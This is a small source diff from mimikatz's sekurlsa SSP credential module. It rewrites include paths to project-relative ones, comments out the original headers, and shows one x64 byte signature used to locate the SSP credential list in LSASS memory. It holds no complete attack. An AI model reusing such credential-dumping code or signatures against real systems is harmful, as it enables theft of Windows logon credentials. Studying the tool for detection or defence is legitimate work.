@@ -1,10 +1,14 @@
+#include "../../../include/mimikatz/inc/globals.h"
+#include "../../../include/mimikatz/modules/kull_m_patch.h"
+#include "../../../include/mimikatz/sekurlsa/packages/kuhl_m_sekurlsa_ssp.h"
+
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : http://creativecommons.org/licenses/by/3.0/fr/
 */
-#include "kuhl_m_sekurlsa_ssp.h"
-#include "core\string_crypt.h"
+//#include "kuhl_m_sekurlsa_ssp.h"
+//#include "core\string_crypt.h"
 
 #ifdef _M_X64
 BYTE PTRN_WIN5_SspCredentialList[]	= {0xc7, 0x43, 0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
